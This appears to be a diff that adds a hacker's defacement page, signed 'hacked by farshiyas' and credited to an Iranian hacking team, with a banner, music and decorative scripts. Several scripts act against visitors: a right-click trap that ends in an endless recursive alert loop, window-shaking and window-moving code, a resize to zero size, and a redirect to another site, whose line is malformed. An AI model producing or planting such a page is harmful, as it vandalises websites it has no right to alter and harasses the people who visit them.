@@ -1,0 +1,591 @@
+<script language="JavaScript">
+function tb5_makeArray(n){
+this.length = n;
+return this.length;
+}
+
+tb5_messages = new tb5_makeArray(2);
+tb5_messages[0] = "Soleh Security Team";
+tb5_messages[1] = "Soleh Security Team";
+tb5_rptType = 'infinite';
+tb5_rptNbr = 10;
+tb5_speed = 50;
+tb5_delay = 2000;
+var tb5_counter=1;
+var tb5_currMsg=0;
+var tb5_stsmsg="";
+function tb5_shuffle(arr){
+var k;
+for (i=0; i<arr.length; i++){
+k = Math.round(Math.random() * (arr.length - i - 1)) + i;
+temp = arr[i];arr[i]=arr[k];arr[k]=temp;
+}
+return arr;
+}
+tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){
+tb5_arr[i] = i;
+tb5_sts[i] = "_";
+}
+tb5_arr = tb5_shuffle(tb5_arr);
+function tb5_init(n){
+var k;
+if (n == tb5_arr.length){
+if (tb5_currMsg == tb5_messages.length-1){
+if ((tb5_rptType == 'finite') && (tb5_counter==tb5_rptNbr)){
+clearTimeout(tb5_timerID);
+return;
+}
+tb5_counter++;
+tb5_currMsg=0;
+}
+else{
+tb5_currMsg++;
+}
+n=0;
+tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){
+tb5_arr[i] = i;
+tb5_sts[i] = "_";
+}
+tb5_arr = tb5_shuffle(tb5_arr);
+tb5_sp=tb5_delay;
+}
+else{
+tb5_sp=tb5_speed;
+k = tb5_arr[n];
+tb5_sts[k] = tb5_messages[tb5_currMsg].charAt(k);
+tb5_stsmsg = "";
+for (var i=0; i<tb5_sts.length; i++)
+tb5_stsmsg += tb5_sts[i];
+document.title = tb5_stsmsg;
+n++;
+}
+tb5_timerID = setTimeout("tb5_init("+n+")", tb5_sp);
+}
+function tb5_randomizetitle(){
+tb5_init(0);
+}
+tb5_randomizetitle();
+</script>
+<link rel='shortcut icon' href='http://iranbuzz.persiangig.com/image/HacKeD%20.gif' type='image/x-icon' />
+<BODY style="tab-interval: 36.0pt" lang=EN-US 
+onload="shake(1); &#13;&#10;loopBackground();" 
+background=[url=http://soleh.org/up/do.php?img=65][img]http://soleh.org/up/do.php?thmb=65[/img][/url]
+aLink=#ccffff link=#df3f1f bgColor=CornflowerBlue text=#ffffff vLink=#df3f1f>
+<script>alert('hacked by farshiyas :|');</script>
+</center><SCRIPT language=JavaScript>
+document.onmousedown=click
+var times=0
+var times2=10
+function click() {
+if ((event.button==2) || (event.button==3)) {
+if (times>=2) { bye() }
+alert("SorrY MaN! U CanT Do Any ThinG!"); 
+times++ } }
+function bye() {
+alert("I SaiD ThaT! Dont ClicK oN This PagE!");
+bye() }
+</SCRIPT>
+<!-- aghaze larzeshe safhe-->
+ 
+<meta http-equiv="Content-Language" content="en-us">
+
+<SCRIPT language=JavaScript>
+<!-- Begin
+function shake(n) {
+if (parent.moveBy) {
+for (i = 10; i > 0; i--) {
+for (j = n; j > 0; j--) {
+
+parent.moveBy(-i,0);
+parent.moveBy(0,-i);
+parent.moveBy(-i,0);
+parent.moveBy(0,i);
+parent.moveBy(i,0);
+parent.moveBy(0,-i);
+parent.moveBy(-i,0);
+parent.moveBy(0,i);
+parent.moveBy(i,0);
+parent.moveBy(0,-i);
+parent.moveBy(-i,0);
+parent.moveBy(0,-i);
+parent.moveBy(i,0);
+parent.moveBy(0,i);
+parent.moveBy(i,0);
+parent.moveBy(0,i);
+         }
+      }
+   }
+
+
+}
+//  End -->
+
+<!--
+shake(1);
+//-->
+</SCRIPT>
+<!-- p align="center"><font size="7" color="#FF0000">chi?</font></p> -->
+
+<!--payan--></SCRIPT>
+
+  
+
+</body>
+</html>
+</body>
+</html>
+<script>
+window.scrollBy(0,0)
+window.resizeTo(0,0)
+window.moveTo(0,0)
+setTimeout("move()", 1);
+var mxm=100000
+var mym=100000
+var mx=100000
+var my=100000
+var sv=70
+var status=1
+var szx=0
+var szy=0
+var c=25
+var n=0
+var sm=10
+var cycle=2
+var done=2
+function move()
+{
+if (status == 1)
+{
+mxm=mxm/1.01
+mym=mym/1.01
+mx=mx+mxm
+my=my-mym
+mxm=mxm+(500-mx)/5
+mym=mym-(400-my)/5
+window.moveTo(mx,my)
+rmxm=Math.round(mxm/1)
+rmym=Math.round(mym/2)
+if (rmxm == 0)
+{
+if (rmym == 0)
+{
+status=2
+}
+}
+}
+if (status == 2)
+{
+sv=sv/1.1
+scrratio=1+1/3
+mx=mx-sv*scrratio/2
+my=my-sv/2
+szx=szx+sv*scrratio
+szy=szy+sv
+window.moveTo(mx,my)
+window.resizeTo(szx,szy)
+if (sv < 0.1)
+{
+status=3
+}
+}
+if (status == 3)
+{
+document.fgColor=0xffffFF
+c=c-16
+if (c<0)
+{status=8}
+}
+if (status == 4)
+{
+c=c+16
+document.bgColor=c*65536
+document.fgColor=(255-c)*65536
+if (c > 239)
+{status=5}
+}
+if (status == 5)
+{
+c=c-16
+document.bgColor=c*65536
+document.fgColor=(255-c)*65536
+if (c < 0)
+{
+status=6
+cycle=cycle-1
+if (cycle > 0)
+{
+if (done == 1)
+{status=7}
+else
+{status=4}
+}
+}
+}
+if (status == 6)
+{
+document.title = "Cljck"
+alert("Cljck")
+cycle=2
+status=4
+done=1
+}
+if (status == 7)
+{
+c=c+4
+document.bgColor=c*65536
+document.fgColor=(255-c)*65536
+if (c > 128)
+{status=8}
+}
+if (status == 8)
+{
+window.moveTo(0,0)
+sx=screen.availWidth
+sy=screen.availHeight
+window.resizeTo(sx,sy)
+status=9
+}
+var timer=setTimeout("move()",0)
+}
+
+</script>
+<script type="text/javascript">
+
+javascript:a=0;x=0;y=0;setInterval("a+=.01;x=Math.cos(a*19)*500;y=Math.sin(a*19)*8;moveBy(x,y)",8);void(0)
+</script>
+<SCRIPT LANGUAGE="JavaScript">
+<!-- Script By AshiYane DiGiTal SecUriTy & IranBuzZ TeaM
+window.location="http://www.soleh.org/"";
+// -->
+</script>
+<CenTer><SCRIPT>
+farbbibliothek = new Array(); 
+farbbibliothek[0] = new Array("#FF0000","#FF1100","#FF2200","#FF3300","#FF4400","#FF5500","#FF6600","#FF7700","#FF8800","#FF9900","#FFaa00","#FFbb00","#FFcc00","#FFdd00","#FFee00","#FFff00","#FFee00","#FFdd00","#FFcc00","#FFbb00","#FFaa00","#FF9900","#FF8800","#FF7700","#FF6600","#FF5500","#FF4400","#FF3300","#FF2200","#FF1100"); 
+farbbibliothek[1] = new Array("#00FF00","#000000","#00FF00","#00FF00"); 
+farbbibliothek[2] = new Array("#00FF00","#FF0000","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00"); 
+farbbibliothek[3] = new Array("#FF0000","#FF4000","#FF8000","#FFC000","#FFFF00","#C0FF00","#80FF00","#40FF00","#00FF00","#00FF40","#00FF80","#00FFC0","#00FFFF","#00C0FF","#0080FF","#0040FF","#0000FF","#4000FF","#8000FF","#C000FF","#FF00FF","#FF00C0","#FF0080","#FF0040"); 
+farbbibliothek[4] = new Array("#FF0000","#EE0000","#DD0000","#CC0000","#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#000000","#110000","#220000","#330000","#440000","#550000","#660000","#770000","#880000","#990000","#AA0000","#BB0000","#CC0000","#DD0000","#EE0000"); 
+farbbibliothek[5] = new Array("#000000","#000000","#000000","#FFFFFF","#FFFFFF","#FFFFFF"); 
+farbbibliothek[6] = new Array("#0000FF","#FFFF00"); 
+farben = farbbibliothek[4];
+function farbschrift() 
+{ 
+for(var i=0 ; i<Buchstabe.length; i++) 
+{ 
+document.all["a"+i].style.color=farben[i]; 
+} 
+farbverlauf(); 
+} 
+function string2array(text) 
+{ 
+Buchstabe = new Array(); 
+while(farben.length<text.length) 
+{ 
+farben = farben.concat(farben); 
+} 
+k=0; 
+while(k<=text.length) 
+{ 
+Buchstabe[k] = text.charAt(k); 
+k++; 
+} 
+} 
+function divserzeugen() 
+{ 
+for(var i=0 ; i<Buchstabe.length; i++) 
+{ 
+document.write("<font face='comic sans ms' size=30><span id='a"+i+"' class='a"+i+"'>"+Buchstabe[i] + "</span></font>"); 
+} 
+farbschrift(); 
+} 
+var a=1; 
+function farbverlauf() 
+{ 
+for(var i=0 ; i<farben.length; i++) 
+{ 
+farben[i-1]=farben[i]; 
+} 
+farben[farben.length-1]=farben[-1]; 
+
+setTimeout("farbschrift()",30); 
+} 
+var farbsatz=1; 
+function farbtauscher() 
+{ 
+farben = farbbibliothek[farbsatz]; 
+while(farben.length<text.length) 
+{ 
+farben = farben.concat(farben); 
+} 
+farbsatz=Math.floor(Math.random()*(farbbibliothek.length-0.0001)); 
+} 
+setInterval("farbtauscher()",5000); 
+text= "MY LoVE IRaAN";
+string2array(text); 
+divserzeugen();
+</SCRIPT>
+<!--MaZiaR--></CenTer>
+<><script type="text/javascript"> 
+TypingText = function(element, interval, cursor, finishedCallback) {
+  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
+    this.running = true;
+    return;
+  }
+  this.element = element;
+  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
+  this.interval = (typeof interval == "undefined" ? 100 : interval);
+  this.origText = this.element.innerHTML;
+  this.unparsedOrigText = this.origText;
+  this.cursor = (cursor ? cursor : "");
+  this.currentText = "";
+  this.currentChar = 0;
+  this.element.typingText = this;
+  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
+  TypingText.all.push(this);
+  this.running = false;
+  this.inTag = false;
+  this.tagBuffer = "";
+  this.inHTMLEntity = false;
+  this.HTMLEntityBuffer = "";
+}
+TypingText.all = new Array();
+TypingText.currentIndex = 0;
+TypingText.runAll = function() {
+  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
+}
+TypingText.prototype.run = function() {
+  if(this.running) return;
+  if(typeof this.origText == "undefined") {
+    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+    return;
+  }
+  if(this.currentText == "") this.element.innerHTML = "";
+  if(this.currentChar < this.origText.length) {
+    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
+      this.tagBuffer = "<";
+      this.inTag = true;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
+      this.tagBuffer += ">";
+      this.inTag = false;
+      this.currentText += this.tagBuffer;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.inTag) {
+      this.tagBuffer += this.origText.charAt(this.currentChar);
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
+      this.HTMLEntityBuffer = "&";
+      this.inHTMLEntity = true;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
+      this.HTMLEntityBuffer += ";";
+      this.inHTMLEntity = false;
+      this.currentText += this.HTMLEntityBuffer;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.inHTMLEntity) {
+      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
+      this.currentChar++;
+      this.run();
+      return;
+    } else {
+      this.currentText += this.origText.charAt(this.currentChar);
+    }
+    this.element.innerHTML = this.currentText;
+    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
+    this.currentChar++;
+    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+  } else {
+	this.currentText = "";
+	this.currentChar = 0;
+        this.running = false;
+        this.finishedCallback();
+  }
+}
+</script>  
+</font><p id="message"><font> <strong><font face="Comic Sans MS"><font color= orange>Y.ID:farshiyaashacker@att.net</font></font></strong><br></>
+<hr >
+<LefT><h2><font face="Franklin Gothic Medium"><font color =orange>soleh.org </font> </font></h2> </LefT>
+<CenTer><img src = http://iranbuzz.persiangig.com/image/HacKeD.gif></CenTer>
+<CenTer> <h1><font face="Segoe Print"><font color =Navy>hacked by farshiyas </font> </font> </h1> </CenTer>
+<hr >
+<br>
+<RigHt> <h3><font face="Comic Sans MS"><font color =green>my name is yaaaaaas </font> </font> </h3> </RigHt>
+<center><div id='music'><object type='application/x-shockwave-flash' data='http://flash-mp3-player.net/medias/player_mp3_mini.swf' width='200' height='20'> <param name='movie' value='http://flash-mp3-player.net/medias/player_mp3_mini.swf' /> <param name='bgcolor' value='#000000' /><param name='FlashVars' value='mp3=http://uploadtak.com/images/v219_music.mp3 &amp;autoplay=1' /></object></div></center>
+<script language="JavaScript">
+
+fCol='444444';
+sCol='FF0000';
+mCol='444444';
+hCol='444444';
+
+YCbase=30;
+XCbase=30;
+
+
+H='...';
+H=H.split('');
+M='....';
+M=M.split('');
+S='.....';
+S=S.split('');
+NS4=(document.layers);
+NS6=(document.getElementById&&!document.all);
+IE4=(document.all);
+Ypos=0;
+Xpos=0;
+cdots=12;
+Split=360/cdots;
+if (NS6){
+for (i=1; i < cdots+1; i++){
+document.write('<div id="n6Digits'+i+'" style="position:absolute;top:0px;left:0px;width:30px;height:30px;font-family:Arial;font-size:10px;color:#'+fCol+';text-align:center;padding-top:10px">'+i+'</div>');
+}
+for (i=0; i < M.length; i++){
+document.write('<div id="Ny'+i+'" style="position:absolute;top:0px;left:0px;width:2px;height:2px;font-size:2px;background:#'+mCol+'"></div>');
+}
+for (i=0; i < H.length; i++){
+document.write('<div id="Nz'+i+'" style="position:absolute;top:0px;left:0px;width:2px;height:2px;font-size:2px;background:#'+hCol+'"></div>');
+}
+for (i=0; i < S.length; i++){
+document.write('<div id="Nx'+i+'" style="position:absolute;top:0px;left:0px;width:2px;height:2px;font-size:2px;background:#'+sCol+'"></div>');
+}
+}
+if (NS4){
+dgts='1 2 3 4 5 6 7 8 9 10 11 12';
+dgts=dgts.split(' ')
+for (i=0; i < cdots; i++){
+document.write('<layer name=nsDigits'+i+' top=0 left=0 height=30 width=30><center><font face=Arial size=1 color='+fCol+'>'+dgts[i]+'</font></center></layer>');
+}
+for (i=0; i < M.length; i++){
+document.write('<layer name=ny'+i+' top=0 left=0 bgcolor='+mCol+' clip="0,0,2,2"></layer>');
+}
+for (i=0; i < H.length; i++){
+document.write('<layer name=nz'+i+' top=0 left=0 bgcolor='+hCol+' clip="0,0,2,2"></layer>');
+}
+for (i=0; i < S.length; i++){
+document.write('<layer name=nx'+i+' top=0 left=0 bgcolor='+sCol+' clip="0,0,2,2"></layer>');
+}
+}
+if (IE4){
+document.write('<div style="position:absolute;top:0px;left:0px"><div style="position:relative">');
+for (i=1; i < cdots+1; i++){
+document.write('<div id="ieDigits" style="position:absolute;top:0px;left:0px;width:30px;height:30px;font-family:Arial;font-size:10px;color:'+fCol+';text-align:center;padding-top:10px">'+i+'</div>');
+}
+document.write('</div></div>')
+document.write('<div style="position:absolute;top:0px;left:0px"><div style="position:relative">');
+for (i=0; i < M.length; i++){
+document.write('<div id=y style="position:absolute;width:2px;height:2px;font-size:2px;background:'+mCol+'"></div>');
+}
+document.write('</div></div>')
+document.write('<div style="position:absolute;top:0px;left:0px"><div style="position:relative">');
+for (i=0; i < H.length; i++){
+document.write('<div id=z style="position:absolute;width:2px;height:2px;font-size:2px;background:'+hCol+'"></div>');
+}
+document.write('</div></div>')
+document.write('<div style="position:absolute;top:0px;left:0px"><div style="position:relative">');
+for (i=0; i < S.length; i++){
+document.write('<div id=x style="position:absolute;width:2px;height:2px;font-size:2px;background:'+sCol+'"></div>');
+}
+document.write('</div></div>')
+}
+
+
+
+function clock(){
+time = new Date ();
+secs = time.getSeconds();
+sec = -1.57 + Math.PI * secs/30;
+mins = time.getMinutes();
+min = -1.57 + Math.PI * mins/30;
+hr = time.getHours();
+hrs = -1.57 + Math.PI * hr/6 + Math.PI*parseInt(time.getMinutes())/360;
+
+if (NS6){
+Ypos=window.pageYOffset+window.innerHeight-YCbase-25;
+Xpos=window.pageXOffset+window.innerWidth-XCbase-30;
+for (i=1; i < cdots+1; i++){
+ document.getElementById("n6Digits"+i).style.top=Ypos-15+YCbase*Math.sin(-1.56 +i *Split*Math.PI/180)
+ document.getElementById("n6Digits"+i).style.left=Xpos-15+XCbase*Math.cos(-1.56 +i*Split*Math.PI/180)
+ }
+for (i=0; i < S.length; i++){
+ document.getElementById("Nx"+i).style.top=Ypos+i*YCbase/4.1*Math.sin(sec);
+ document.getElementById("Nx"+i).style.left=Xpos+i*XCbase/4.1*Math.cos(sec);
+ }
+for (i=0; i < M.length; i++){
+ document.getElementById("Ny"+i).style.top=Ypos+i*YCbase/4.1*Math.sin(min);
+ document.getElementById("Ny"+i).style.left=Xpos+i*XCbase/4.1*Math.cos(min);
+ }
+for (i=0; i < H.length; i++){
+ document.getElementById("Nz"+i).style.top=Ypos+i*YCbase/4.1*Math.sin(hrs);
+ document.getElementById("Nz"+i).style.left=Xpos+i*XCbase/4.1*Math.cos(hrs);
+ }
+}
+if (NS4){
+Ypos=window.pageYOffset+window.innerHeight-YCbase-20;
+Xpos=window.pageXOffset+window.innerWidth-XCbase-30;
+for (i=0; i < cdots; ++i){
+ document.layers["nsDigits"+i].top=Ypos-5+YCbase*Math.sin(-1.045 +i*Split*Math.PI/180)
+ document.layers["nsDigits"+i].left=Xpos-15+XCbase*Math.cos(-1.045 +i*Split*Math.PI/180)
+ }
+for (i=0; i < S.length; i++){
+ document.layers["nx"+i].top=Ypos+i*YCbase/4.1*Math.sin(sec);
+ document.layers["nx"+i].left=Xpos+i*XCbase/4.1*Math.cos(sec);
+ }
+for (i=0; i < M.length; i++){
+ document.layers["ny"+i].top=Ypos+i*YCbase/4.1*Math.sin(min);
+ document.layers["ny"+i].left=Xpos+i*XCbase/4.1*Math.cos(min);
+ }
+for (i=0; i < H.length; i++){
+ document.layers["nz"+i].top=Ypos+i*YCbase/4.1*Math.sin(hrs);
+ document.layers["nz"+i].left=Xpos+i*XCbase/4.1*Math.cos(hrs);
+ }
+}
+
+if (IE4){
+Ypos=document.body.scrollTop+window.document.body.clientHeight-YCbase-20;
+Xpos=document.body.scrollLeft+window.document.body.clientWidth-XCbase-20;
+for (i=0; i < cdots; ++i){
+ ieDigits[i].style.pixelTop=Ypos-15+YCbase*Math.sin(-1.045 +i *Split*Math.PI/180)
+ ieDigits[i].style.pixelLeft=Xpos-15+XCbase*Math.cos(-1.045 +i *Split*Math.PI/180)
+ }
+for (i=0; i < S.length; i++){
+ x[i].style.pixelTop =Ypos+i*YCbase/4.1*Math.sin(sec);
+ x[i].style.pixelLeft=Xpos+i*XCbase/4.1*Math.cos(sec);
+ }
+for (i=0; i < M.length; i++){
+ y[i].style.pixelTop =Ypos+i*YCbase/4.1*Math.sin(min);
+ y[i].style.pixelLeft=Xpos+i*XCbase/4.1*Math.cos(min);
+ }
+for (i=0; i < H.length; i++){
+ z[i].style.pixelTop =Ypos+i*YCbase/4.1*Math.sin(hrs);
+ z[i].style.pixelLeft=Xpos+i*XCbase/4.1*Math.cos(hrs);
+ }
+}
+setTimeout('clock()',100);
+}
+clock();
+//-->
+</script>
+<SCRIPT  language="JavaScript">
+var today_date= new Date()
+var month=today_date.getMonth()+1
+var today=today_date.getDate()
+var year=today_date.getFullYear()
+document.write("Today's date is: "+month+"/"+today+"/"+year)
+</SCRIPT>
+</body>
+<!---*~.~* AshiYaNe DefAcE PaGe DesIgNeR By IranBuzZ TeaM (!!v!!az!ar@NimBuzZ.CoM) *~.~*--->
+</html>
